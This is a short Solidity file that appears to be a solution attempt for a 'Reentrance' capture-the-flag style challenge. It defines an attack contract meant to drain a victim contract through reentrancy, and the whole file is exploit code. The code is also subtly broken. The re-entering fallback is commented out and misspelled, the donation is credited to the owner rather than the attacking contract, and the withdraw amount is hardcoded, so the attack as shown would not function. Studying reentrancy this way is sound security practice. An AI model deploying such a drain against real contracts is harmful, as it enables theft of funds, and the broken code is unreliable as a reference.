// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './og.sol';

contract ReEntrancyAttack{
  address victim ;
  Reentrance victimContract;
  address immutable onwer;
  
  constructor(){
    onwer = msg.sender;
  }

  function startAttack( ) public payable{
   victimContract.donate{value:msg.value}(onwer); 
  victimContract.withdraw(10000000000); 
  }

  function setVictim(address _victim) public{
    victim = _victim;
    victimContract = Reentrance(payable(_victim));
  }

  // fallback() extrenal payable{
  //   victimContract.withdraw(10000000000); 
  // }

}
